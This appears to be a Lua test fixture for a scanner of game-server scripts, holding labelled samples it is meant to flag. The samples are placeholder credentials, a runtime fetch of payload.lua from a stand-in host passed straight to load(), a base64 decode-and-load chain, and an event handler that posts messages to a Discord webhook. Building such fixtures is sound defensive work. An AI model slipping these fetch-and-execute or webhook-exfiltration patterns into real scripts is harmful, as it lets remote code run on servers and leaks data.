-- All values below are fictional placeholders used to exercise detection.
-- They are not valid credentials and address nothing that exists.

local webhook = 'https://discord.com/api/webhooks/000000000000000000/EXAMPLE_FIXTURE_TOKEN_NOT_REAL'
local api_key = 'EXAMPLE_FIXTURE_API_KEY_0000000000000000'
local password = 'EXAMPLE_NOT_A_REAL_PASSWORD'

-- SEC-REMOTE-LOAD-001: content fetched at runtime and passed to a loader.
PerformHttpRequest('https://fixture.invalid/payload.lua', function(status, body)
    if status == 200 then
        local chunk = load(body)
        if chunk then chunk() end
    end
end)

-- SEC-OBFUSCATION-001: encoded literal followed by a decode chain.
local encoded = 'ZnVuY3Rpb24gZml4dHVyZSgpIHJldHVybiB0cnVlIGVuZA=='
local decoded = FromBase64(encoded)
load(decoded)

RegisterNetEvent('sf_suspicious:report', function(message)
    PerformHttpRequest(webhook, function() end, 'POST', json.encode({ content = message }))
end)
